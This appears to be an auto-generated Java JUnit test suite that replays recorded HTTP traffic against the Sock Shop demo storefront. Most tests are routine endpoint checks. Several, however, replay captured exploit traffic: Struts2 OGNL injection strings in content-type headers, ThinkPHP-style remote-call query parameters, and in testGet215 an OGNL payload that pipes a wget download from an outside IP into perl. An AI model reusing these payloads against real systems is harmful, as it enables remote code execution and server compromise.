package com.up9.generated;

import com.up9.generated.Authentication;
import com.up9.up9lib.HttpRequest;
import com.up9.up9lib.HttpTarget;
import java.io.IOException;
import java.net.MalformedURLException;
import java.util.Hashtable;
import javax.json.JsonObject;
import net.joshka.junit.json.params.JsonFileSource;
import okhttp3.Response;
import org.junit.jupiter.api.MethodOrderer.Alphanumeric;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.TestMethodOrder;
import org.junit.jupiter.params.ParameterizedTest;
import static com.up9.up9lib.Common.*;

@TestMethodOrder(Alphanumeric.class)
public class TestsFrontEndSockShopTest
{
    @ParameterizedTest
    @JsonFileSource(resources = "/1/dataset_1.json")
    public void testGet001(final JsonObject json) throws MalformedURLException, IOException
    {
        final String amp_cache_transform = json.getString("amp_cache_transform");
        final String content = json.getString("content");
        final String keep_alive = json.getString("keep_alive");
        final String param = json.getString("param");
        final String postman_token = json.getString("postman_token");
        final String r = json.getString("r");
        final String s = json.getString("s");
        final String vars_0_ = json.getString("vars_0_");
        final String x_datadog_parent_id = json.getString("x_datadog_parent_id");
        final String x_datadog_trace_id = json.getString("x_datadog_trace_id");

        // GET http://front-end.sock-shop/ (endp 1)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setQueryString(new Hashtable<String, Object>() {{
            put("", param);
            put("XDEBUG_SESSION_START", "phpstorm");
            put("a", "fetch");
            put("content", content);
            put("debug", "1");
            put("function", "call_user_func_array");
            put("q", "login.destroy.session");
            put("r", r);
            put("s", s);
            put("up_auto_log", "true");
            put("vars[0]", vars_0_);
        }});
        request.setHeaders(new Hashtable<String, Object>() {{
            put("accept", "text/html");
            put("amp-cache-transform", amp_cache_transform);
            put("keep-alive", keep_alive);
            put("postman-token", postman_token);
            put("x-datadog-parent-id", x_datadog_parent_id);
            put("x-datadog-sampling-priority", "0");
            put("x-datadog-trace-id", x_datadog_trace_id);
        }});
        final Response response = frontEndSockShop.get(request, "/");
        assertStatusCode(response.code(), 200);
        assertCSSselect("div#hot div.box div.container div h2", "Hot this week", response.body().string());
    }

    @ParameterizedTest
    @JsonFileSource(resources = "/125/dataset_125.json")
    public void testGet125(final JsonObject json) throws MalformedURLException, IOException
    {
        final String content = json.getString("content");

        // GET http://front-end.sock-shop/ (endp 125)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setQueryString(new Hashtable<String, Object>() {{
            put("a", "fetch");
            put("content", content);
        }});
        request.setHeaders(new Hashtable<String, Object>() {{
            put("content-type", "application/json");
        }});
        final Response response = frontEndSockShop.get(request, "/");
        assertStatusCode(response.code(), 200);
        assertCSSselect("div#hot div.box div.container div h2", "Hot this week", response.body().string());
    }

    @Test
    public void testGet187() throws MalformedURLException, IOException
    {
        // GET http://front-end.sock-shop/ (endp 187)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("content-type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X30mknbA'");
        }});
        final Response response = frontEndSockShop.get(request, "/");
        assertStatusCode(response.code(), 200);
        assertCSSselect("div#hot div.box div.container div h2", "Hot this week", response.body().string());
    }

    @Test
    public void testGet190() throws MalformedURLException, IOException
    {
        // GET http://front-end.sock-shop/ (endp 190)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("content-type", "application/x-www-form-urlencoded");
        }});
        final Response response = frontEndSockShop.get(request, "/");
        assertStatusCode(response.code(), 200);
        assertCSSselect("div#hot div.box div.container div h2", "Hot this week", response.body().string());
    }

    @Test
    public void testHead191() throws MalformedURLException, IOException
    {
        // HEAD http://front-end.sock-shop/ (endp 191)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        final Response response = frontEndSockShop.head(request, "/");
        assertStatusCode(response.code(), 200);
    }

    @Test
    public void testGet192() throws MalformedURLException, IOException
    {
        // GET http://front-end.sock-shop/ (endp 192)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("content-type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('x4KNnCMm'");
        }});
        final Response response = frontEndSockShop.get(request, "/");
        assertStatusCode(response.code(), 200);
        assertCSSselect("div#hot div.box div.container div h2", "Hot this week", response.body().string());
    }

    @Test
    public void testGet193() throws MalformedURLException, IOException
    {
        // GET http://front-end.sock-shop/ (endp 193)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("content-type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('xVSERkYM'");
        }});
        final Response response = frontEndSockShop.get(request, "/");
        assertStatusCode(response.code(), 200);
        assertCSSselect("div#hot div.box div.container div h2", "Hot this week", response.body().string());
    }

    @Test
    public void testGet194() throws MalformedURLException, IOException
    {
        // GET http://front-end.sock-shop/ (endp 194)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("content-type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('tMeGL0pH'");
        }});
        final Response response = frontEndSockShop.get(request, "/");
        assertStatusCode(response.code(), 200);
        assertCSSselect("div#hot div.box div.container div h2", "Hot this week", response.body().string());
    }

    @Test
    public void testGet195() throws MalformedURLException, IOException
    {
        // GET http://front-end.sock-shop/ (endp 195)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("content-type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('Uhk9c9CM'");
        }});
        final Response response = frontEndSockShop.get(request, "/");
        assertStatusCode(response.code(), 200);
        assertCSSselect("div#hot div.box div.container div h2", "Hot this week", response.body().string());
    }

    @Test
    public void testGet207() throws MalformedURLException, IOException
    {
        // GET http://front-end.sock-shop/ (endp 207)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("content-type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('qieoAZ6u'");
        }});
        final Response response = frontEndSockShop.get(request, "/");
        assertStatusCode(response.code(), 200);
        assertCSSselect("div#hot div.box div.container div h2", "Hot this week", response.body().string());
    }

    @Test
    public void testGet211() throws MalformedURLException, IOException
    {
        // GET http://front-end.sock-shop/ (endp 211)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("content-type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('uUVc2U8M'");
        }});
        final Response response = frontEndSockShop.get(request, "/");
        assertStatusCode(response.code(), 200);
        assertCSSselect("div#hot div.box div.container div h2", "Hot this week", response.body().string());
    }

    @Test
    public void testGet212() throws MalformedURLException, IOException
    {
        // GET http://front-end.sock-shop/ (endp 212)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("content-type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('liape4t0'");
        }});
        final Response response = frontEndSockShop.get(request, "/");
        assertStatusCode(response.code(), 200);
        assertCSSselect("div#hot div.box div.container div h2", "Hot this week", response.body().string());
    }

    @Test
    public void testGet213() throws MalformedURLException, IOException
    {
        // GET http://front-end.sock-shop/ (endp 213)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("content-type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('uuurxrfw'");
        }});
        final Response response = frontEndSockShop.get(request, "/");
        assertStatusCode(response.code(), 200);
        assertCSSselect("div#hot div.box div.container div h2", "Hot this week", response.body().string());
    }

    @Test
    public void testGet214() throws MalformedURLException, IOException
    {
        // GET http://front-end.sock-shop/ (endp 214)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("content-type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('jyu8xkii'");
        }});
        final Response response = frontEndSockShop.get(request, "/");
        assertStatusCode(response.code(), 200);
        assertCSSselect("div#hot div.box div.container div h2", "Hot this week", response.body().string());
    }

    @Test
    public void testGet215() throws MalformedURLException, IOException
    {
        // GET http://front-end.sock-shop/ (endp 215)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("content-type", "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget -qO - http://209.90.79.141/pdf/s.pdf | perl");
        }});
        final Response response = frontEndSockShop.get(request, "/");
        assertStatusCode(response.code(), 200);
        assertCSSselect("div#hot div.box div.container div h2", "Hot this week", response.body().string());
    }

    @Test
    public void testGet216() throws MalformedURLException, IOException
    {
        // GET http://front-end.sock-shop/ (endp 216)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("content-type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('dyi8d0Jw'");
        }});
        final Response response = frontEndSockShop.get(request, "/");
        assertStatusCode(response.code(), 200);
        assertCSSselect("div#hot div.box div.container div h2", "Hot this week", response.body().string());
    }

    @Test
    public void testGet218() throws MalformedURLException, IOException
    {
        // GET http://front-end.sock-shop/ (endp 218)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("content-type", "text/html");
        }});
        final Response response = frontEndSockShop.get(request, "/");
        assertStatusCode(response.code(), 200);
        assertCSSselect("div#hot div.box div.container div h2", "Hot this week", response.body().string());
    }

    @Test
    public void testGet219() throws MalformedURLException, IOException
    {
        // GET http://front-end.sock-shop/ (endp 219)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("content-type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('jycf9lqq'");
        }});
        final Response response = frontEndSockShop.get(request, "/");
        assertStatusCode(response.code(), 200);
        assertCSSselect("div#hot div.box div.container div h2", "Hot this week", response.body().string());
    }

    @Test
    public void testGet220() throws MalformedURLException, IOException
    {
        // GET http://front-end.sock-shop/ (endp 220)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("content-type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('pkpxommw'");
        }});
        final Response response = frontEndSockShop.get(request, "/");
        assertStatusCode(response.code(), 200);
        assertCSSselect("div#hot div.box div.container div h2", "Hot this week", response.body().string());
    }

    @Test
    public void testGet225() throws MalformedURLException, IOException
    {
        // GET http://front-end.sock-shop/ (endp 225)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("content-type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('zUn5ygGk'");
        }});
        final Response response = frontEndSockShop.get(request, "/");
        assertStatusCode(response.code(), 200);
        assertCSSselect("div#hot div.box div.container div h2", "Hot this week", response.body().string());
    }

    @Test
    public void testGet227() throws MalformedURLException, IOException
    {
        // GET http://front-end.sock-shop/ (endp 227)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("content-type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('hnBSMl1i'");
        }});
        final Response response = frontEndSockShop.get(request, "/");
        assertStatusCode(response.code(), 200);
        assertCSSselect("div#hot div.box div.container div h2", "Hot this week", response.body().string());
    }

    @Test
    public void testGet235() throws MalformedURLException, IOException
    {
        // GET http://front-end.sock-shop/ (endp 235)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("content-type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('o4einzpi'");
        }});
        final Response response = frontEndSockShop.get(request, "/");
        assertStatusCode(response.code(), 200);
        assertCSSselect("div#hot div.box div.container div h2", "Hot this week", response.body().string());
    }

    @Test
    public void testGet236() throws MalformedURLException, IOException
    {
        // GET http://front-end.sock-shop/ (endp 236)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("content-type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('rfi8x4t9'");
        }});
        final Response response = frontEndSockShop.get(request, "/");
        assertStatusCode(response.code(), 200);
        assertCSSselect("div#hot div.box div.container div h2", "Hot this week", response.body().string());
    }

    @Test
    public void testGet237() throws MalformedURLException, IOException
    {
        // GET http://front-end.sock-shop/ (endp 237)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("content-type", "text/plain");
        }});
        final Response response = frontEndSockShop.get(request, "/");
        assertStatusCode(response.code(), 200);
        assertCSSselect("div#hot div.box div.container div h2", "Hot this week", response.body().string());
    }

    @Test
    public void testGet238() throws MalformedURLException, IOException
    {
        // GET http://front-end.sock-shop/ (endp 238)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("content-type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('VEh255IZ'");
        }});
        final Response response = frontEndSockShop.get(request, "/");
        assertStatusCode(response.code(), 200);
        assertCSSselect("div#hot div.box div.container div h2", "Hot this week", response.body().string());
    }

    @Test
    public void testGet241() throws MalformedURLException, IOException
    {
        // GET http://front-end.sock-shop/ (endp 241)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("content-type", "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('b1ko6ejb'");
        }});
        final Response response = frontEndSockShop.get(request, "/");
        assertStatusCode(response.code(), 200);
        assertCSSselect("div#hot div.box div.container div h2", "Hot this week", response.body().string());
    }

    @ParameterizedTest
    @JsonFileSource(resources = "/40/dataset_40.json")
    public void testGetParam040(final JsonObject json) throws MalformedURLException, IOException
    {
        final String bs_real_ip = json.getString("bs_real_ip");
        final String param = json.getString("param");

        // GET http://front-end.sock-shop/{param} (endp 40)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("bs_real_ip", bs_real_ip);
            put("x-requested-with", "XMLHttpRequest");
        }});
        final Response response = frontEndSockShop.get(request, "/" + param);
        assertStatusCode(response.code(), 200);
        assertCSSselect("div#hot div.box div.container div h2", "Hot this week", response.body().string());
    }

    @ParameterizedTest
    @JsonFileSource(resources = "/50/dataset_50.json")
    public void testGetAddress050(final JsonObject json) throws MalformedURLException, IOException
    {
        final String amp_cache_transform = json.getString("amp_cache_transform");
        final String postman_token = json.getString("postman_token");

        // GET http://front-end.sock-shop/address (endp 50)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("amp-cache-transform", amp_cache_transform);
            put("postman-token", postman_token);
            put("x-requested-with", "XMLHttpRequest");
        }});
        final Response response = frontEndSockShop.get(request, "/address");
        assertStatusCode(response.code(), 200);
        assertJSONPath("$._links.self.href", response.body().string());
    }

    @ParameterizedTest
    @JsonFileSource(resources = "/170/dataset_170.json")
    public void testPostAddresses170(final JsonObject json) throws MalformedURLException, IOException
    {
        final String city = json.getString("city");
        final String country = json.getString("country");
        final String number = json.getString("number");
        final String postman_token = json.getString("postman_token");
        final String street = json.getString("street");

        // GET http://front-end.sock-shop/customers/{customerId} (endp 62)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("postman-token", postman_token);
            put("x-requested-with", "XMLHttpRequest");
        }});
        final Response response = frontEndSockShop.get(request, "/customers/" + getCookie(response, "logged_in"));
        assertStatusCode(response.code(), 200);
        assertJSONPath("$._links.self.href", response.body().string());
        final String postcode = JSONPath("$.lastName", response.body().string());

        // POST http://front-end.sock-shop/addresses (endp 170)
        final HttpRequest request2 = new HttpRequest();
        request2.setHeaders(new Hashtable<String, Object>() {{
            put("content-type", "application/json");
            put("x-requested-with", "XMLHttpRequest");
        }});
        request2.setJsonBody("170/payload_for_endp_170.json", new Hashtable<String, Object>() {{
            put("$.city", city);
            put("$.country", country);
            put("$.number", number);
            put("$.postcode", postcode);
            put("$.street", street);
        }});
        final Response response2 = frontEndSockShop.post(request2, "/addresses");
        assertStatusCode(response2.code(), 200);
        assertJSONPath("$.id", response2.body().string());
    }

    @ParameterizedTest
    @JsonFileSource(resources = "/8/dataset_8.json")
    public void testGetBasketHtml008(final JsonObject json) throws MalformedURLException, IOException
    {
        final String amp_cache_transform = json.getString("amp_cache_transform");

        // GET http://front-end.sock-shop/basket.html (endp 8)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("amp-cache-transform", amp_cache_transform);
        }});
        final Response response = frontEndSockShop.get(request, "/basket.html");
        assertStatusCode(response.code(), 200);
        assertCSSselect("div#basket div.box form h1", "Shopping cart", response.body().string());
    }

    @ParameterizedTest
    @JsonFileSource(resources = "/52/dataset_52.json")
    public void testGetCard052(final JsonObject json) throws MalformedURLException, IOException
    {
        final String amp_cache_transform = json.getString("amp_cache_transform");
        final String postman_token = json.getString("postman_token");

        // GET http://front-end.sock-shop/card (endp 52)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("amp-cache-transform", amp_cache_transform);
            put("postman-token", postman_token);
            put("x-requested-with", "XMLHttpRequest");
        }});
        final Response response = frontEndSockShop.get(request, "/card");
        assertStatusCode(response.code(), 200);
        assertJSONPath("$.number", response.body().string());
    }

    @ParameterizedTest
    @JsonFileSource(resources = "/173/dataset_173.json")
    public void testPostCards173(final JsonObject json) throws MalformedURLException, IOException
    {
        final String ccv = json.getString("ccv");
        final String expires = json.getString("expires");
        final String longNum = json.getString("longNum");

        // POST http://front-end.sock-shop/cards (endp 173)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("content-type", "application/json");
            put("x-requested-with", "XMLHttpRequest");
        }});
        request.setJsonBody("173/payload_for_endp_173.json", new Hashtable<String, Object>() {{
            put("$.ccv", ccv);
            put("$.expires", expires);
            put("$.longNum", longNum);
        }});
        final Response response = frontEndSockShop.post(request, "/cards");
        assertStatusCode(response.code(), 200);
        assertJSONPath("$.id", response.body().string());
    }

    @ParameterizedTest
    @JsonFileSource(resources = "/9/dataset_9.json")
    public void testPostCart009(final JsonObject json) throws MalformedURLException, IOException
    {
        final String amp_cache_transform = json.getString("amp_cache_transform");
        final String postman_token = json.getString("postman_token");
        final String postman_token1 = json.getString("postman_token1");
        final String size = json.getString("size");
        final String tags = json.getString("tags");

        // GET http://front-end.sock-shop/catalogue (endp 11)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setQueryString(new Hashtable<String, Object>() {{
            put("page", "1");
            put("size", size);
            put("sort", "id");
            put("tags", tags);
        }});
        request.setHeaders(new Hashtable<String, Object>() {{
            put("amp-cache-transform", amp_cache_transform);
            put("postman-token", postman_token);
            put("x-requested-with", "XMLHttpRequest");
        }});
        final Response response = frontEndSockShop.get(request, "/catalogue");
        assertStatusCode(response.code(), 200);
        assertJSONPath("$[*].tag[*]", response.body().string());
        final String id = JSONPath("$[*].id", response.body().string());

        // POST http://front-end.sock-shop/cart (endp 9)
        final HttpRequest request2 = new HttpRequest();
        request2.setHeaders(new Hashtable<String, Object>() {{
            put("content-type", "application/json");
            put("postman-token", postman_token1);
            put("x-requested-with", "XMLHttpRequest");
        }});
        request2.setJsonBody("9/payload_for_endp_9.json", new Hashtable<String, Object>() {{
            put("$.id", id);
        }});
        final Response response2 = frontEndSockShop.post(request2, "/cart");
        assertStatusCode(response2.code(), 201);
    }

    @ParameterizedTest
    @JsonFileSource(resources = "/35/dataset_35.json")
    public void testGetCart035(final JsonObject json) throws MalformedURLException, IOException
    {
        final String amp_cache_transform = json.getString("amp_cache_transform");
        final String postman_token = json.getString("postman_token");

        // GET http://front-end.sock-shop/cart (endp 35)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("amp-cache-transform", amp_cache_transform);
            put("postman-token", postman_token);
            put("x-requested-with", "XMLHttpRequest");
        }});
        final Response response = frontEndSockShop.get(request, "/cart");
        assertStatusCode(response.code(), 200);
        assertJSONPath("$[*].id", response.body().string());
    }

    @ParameterizedTest
    @JsonFileSource(resources = "/234/dataset_234.json")
    public void testPostCartUpdate234(final JsonObject json) throws MalformedURLException, IOException
    {
        final String id = json.getString("id");

        // POST http://front-end.sock-shop/cart/update (endp 234)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setHeaders(new Hashtable<String, Object>() {{
            put("content-type", "application/json");
            put("x-requested-with", "XMLHttpRequest");
        }});
        request.setJsonBody("234/payload_for_endp_234.json", new Hashtable<String, Object>() {{
            put("$.id", id);
        }});
        final Response response = frontEndSockShop.post(request, "/cart/update");
        assertStatusCode(response.code(), 202);
    }

    @ParameterizedTest
    @JsonFileSource(resources = "/199/dataset_199.json")
    public void testGetCatalogue199(final JsonObject json) throws MalformedURLException, IOException
    {
        final String size = json.getString("size");
        final String tags = json.getString("tags");

        // GET http://front-end.sock-shop/catalogue (endp 199)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setQueryString(new Hashtable<String, Object>() {{
            put("page", "1");
            put("size", size);
            put("tags", tags);
        }});
        request.setHeaders(new Hashtable<String, Object>() {{
            put("x-requested-with", "XMLHttpRequest");
        }});
        final Response response = frontEndSockShop.get(request, "/catalogue");
        assertStatusCode(response.code(), 200);
    }

    @ParameterizedTest
    @JsonFileSource(resources = "/206/dataset_206.json")
    public void testGetCatalogue206(final JsonObject json) throws MalformedURLException, IOException
    {
        final String size = json.getString("size");

        // GET http://front-end.sock-shop/catalogue (endp 206)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setQueryString(new Hashtable<String, Object>() {{
            put("size", size);
        }});
        request.setHeaders(new Hashtable<String, Object>() {{
            put("x-requested-with", "XMLHttpRequest");
        }});
        final Response response = frontEndSockShop.get(request, "/catalogue");
        assertStatusCode(response.code(), 200);
    }

    @ParameterizedTest
    @JsonFileSource(resources = "/56/dataset_56.json")
    public void testGetCatalogueId056(final JsonObject json) throws MalformedURLException, IOException
    {
        final String amp_cache_transform = json.getString("amp_cache_transform");
        final String postman_token = json.getString("postman_token");
        final String postman_token1 = json.getString("postman_token1");
        final String size = json.getString("size");
        final String tags = json.getString("tags");

        // GET http://front-end.sock-shop/catalogue (endp 11)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setQueryString(new Hashtable<String, Object>() {{
            put("page", "1");
            put("size", size);
            put("sort", "id");
            put("tags", tags);
        }});
        request.setHeaders(new Hashtable<String, Object>() {{
            put("amp-cache-transform", amp_cache_transform);
            put("postman-token", postman_token);
            put("x-requested-with", "XMLHttpRequest");
        }});
        final Response response = frontEndSockShop.get(request, "/catalogue");
        assertStatusCode(response.code(), 200);
        assertJSONPath("$[*].tag[*]", response.body().string());
        final String id = JSONPath("$[*].id", response.body().string());

        // GET http://front-end.sock-shop/catalogue/{id} (endp 56)
        final HttpRequest request2 = new HttpRequest();
        request2.setHeaders(new Hashtable<String, Object>() {{
            put("postman-token", postman_token1);
            put("x-requested-with", "XMLHttpRequest");
        }});
        final Response response2 = frontEndSockShop.get(request2, "/catalogue/" + id);
        assertStatusCode(response2.code(), 200);
        assertJSONPath("$.tag[*]", response2.body().string());
    }

    @ParameterizedTest
    @JsonFileSource(resources = "/36/dataset_36.json")
    public void testGetCatalogueSize036(final JsonObject json) throws MalformedURLException, IOException
    {
        final String amp_cache_transform = json.getString("amp_cache_transform");
        final String postman_token = json.getString("postman_token");
        final String tags = json.getString("tags");

        // GET http://front-end.sock-shop/catalogue/size (endp 36)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setQueryString(new Hashtable<String, Object>() {{
            put("tags", tags);
        }});
        request.setHeaders(new Hashtable<String, Object>() {{
            put("amp-cache-transform", amp_cache_transform);
            put("postman-token", postman_token);
            put("x-requested-with", "XMLHttpRequest");
        }});
        final Response response = frontEndSockShop.get(request, "/catalogue/size");
        assertStatusCode(response.code(), 200);
        assertJSONPath("$.tag[*]", response.body().string());
    }

    @Test
    public void testGetCatalogueSize201() throws MalformedURLException, IOException
    {
        // GET http://front-end.sock-shop/catalogue/size (endp 201)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setQueryString(new Hashtable<String, Object>() {{
            put("tags", "");
        }});
        request.setHeaders(new Hashtable<String, Object>() {{
            put("x-requested-with", "XMLHttpRequest");
        }});
        final Response response = frontEndSockShop.get(request, "/catalogue/size");
        assertStatusCode(response.code(), 200);
    }

    @ParameterizedTest
    @JsonFileSource(resources = "/12/dataset_12.json")
    public void testGetCategoryHtml012(final JsonObject json) throws MalformedURLException, IOException
    {
        final String amp_cache_transform = json.getString("amp_cache_transform");
        final String tags = json.getString("tags");

        // GET http://front-end.sock-shop/category.html (endp 12)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setQueryString(new Hashtable<String, Object>() {{
            put("tags", tags);
        }});
        request.setHeaders(new Hashtable<String, Object>() {{
            put("amp-cache-transform", amp_cache_transform);
        }});
        final Response response = frontEndSockShop.get(request, "/category.html");
        assertStatusCode(response.code(), 200);
        assertCSSselect("div#content div.container div div.panel.panel-default.sidebar-menu div.panel-heading h3.panel-title", "Filters ", response.body().string());
    }

    @Test
    public void testGetCategoryHtml242() throws MalformedURLException, IOException
    {
        // GET http://front-end.sock-shop/category.html (endp 242)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        final Response response = frontEndSockShop.get(request, "/category.html");
        assertStatusCode(response.code(), 206);
    }

    @ParameterizedTest
    @JsonFileSource(resources = "/60/dataset_60.json")
    public void testGetCustomerOrderHtml060(final JsonObject json) throws MalformedURLException, IOException
    {
        final String order = json.getString("order");
        final String postman_token = json.getString("postman_token");

        // GET http://front-end.sock-shop/customer-order.html (endp 60)
        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
        final HttpRequest request = new HttpRequest();
        request.setQueryString(new Hashtable<String, Object>() {{
            put("order", order);
        }});
